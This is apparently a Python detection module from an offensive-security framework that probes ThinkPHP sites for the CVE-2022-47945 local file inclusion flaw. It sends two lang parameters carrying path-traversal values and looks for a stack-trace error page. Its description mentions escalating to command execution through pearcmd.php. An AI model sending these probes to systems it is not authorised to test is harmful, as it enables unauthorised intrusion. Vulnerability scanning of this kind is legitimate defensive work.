#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkPHP Framework before 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Thinkphp Lang - Local File Inclusion Detection',
        'description': 'ThinkPHP Framework before 6.0.14 allows local file inclusion via the lang parameter when the language pack feature is enabled (lang_switch_on=true). An unauthenticated and remote attacker can exploit this to execute arbitrary operating system commands, as demonstrated by including pearcmd.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'thinkphp', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://tttang.com/archive/1865/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-47945',
            'https://github.com/top-think/framework/compare/v6.0.13...v6.0.14',
            'https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-47945',
    }

    def run(self):
        for path in ('/?lang=../../thinkphp/base', '/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 500:
                continue
            body = r.text or ""
            body_all = ('Call Stack', 'class="trace',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='critical',
                    reason="Thinkphp Lang - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

